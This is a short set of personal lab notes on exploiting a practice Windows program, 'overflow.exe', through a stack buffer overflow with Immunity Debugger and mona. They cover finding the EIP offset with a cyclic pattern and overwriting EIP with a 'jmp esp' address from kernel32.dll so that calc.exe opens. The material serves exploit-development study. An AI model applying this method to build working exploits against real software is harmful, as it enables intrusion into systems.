use overflow.exe you created 
1. !mona config -set workingfolder c:\mona\%p
2. !mona pc 100 //pattern
3. in c:\mona\overflow, copy ASCII
4. press << to restart the program
5. run again, paste the ASCII in the terminal
6. back to immunity, copy the EIP address
7. !mona po <EIP address>//pattern offset
8. check the output, it will say pattern xxx found in cyclic pattern at position 62..
//now we know how many byte we need to fill up to reach EIP
//since this is window and it runs dll file, we can use kernel32.dll
//to find "jmp esp". overwrite the EIP with the jump instruction in the kernel32.dll
//that will make it to jump to our other address which is locate in the esp register
9. !mona jmp -r esp -m kernel
//copy one of the address
//for my case is 7530F547
10. open a python file (xploit.py), check out the code there
11. if all goes well, execute the python file and it should open calc.exe
